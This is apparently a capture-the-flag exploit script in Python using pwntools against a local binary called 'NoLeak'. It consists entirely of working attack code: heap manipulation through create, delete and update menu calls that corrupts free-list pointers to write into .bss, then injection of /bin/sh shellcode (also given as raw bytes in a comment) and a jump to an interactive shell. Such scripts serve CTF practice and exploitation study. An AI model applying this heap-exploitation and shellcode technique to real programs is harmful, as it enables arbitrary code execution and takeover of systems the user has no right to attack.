from pwn import *
context(log_level='debug',arch='amd64',os='linux')
p=process('./NoLeak')
#bss='0x0000000000601040'
#gdb.attach(p,'''
#	break *0x00000000004009ac
#	continue
#''')
def create(size,data):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Data: ')
	p.sendline(str(data))

def delete(index):
	p.recvuntil('Your choice :')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(index))

def update(index,size,data):
	p.recvuntil('Your choice :')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(index))
	p.recvuntil('Size: ')
	p.sendline(str(size))
	p.recvuntil('Data: ')
	p.sendline(str(data))

def exit():
	p.recvuntil('Your choice :')
	p.sendline('4')
magic=0x0000000000601040
shellcode=asm(shellcraft.sh())
#shellcode='\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
create(0x60,'0000')
create(0x80,'1111') 
create(0x80,'2222') 
delete(1)
update(1,0x10,p64(magic+0x20)*2)
create(0x80,'3333')
delete(0)
update(0,0x8,p64(0x60106d))
create(0x60,'3333')
create(0x60,'aaa'+p64(0x601070)+p64(0x601080))
update(8,1,p64(0x10))
update(6,8,p64(0x601080))
update(9,len(shellcode),shellcode)

p.interactive()

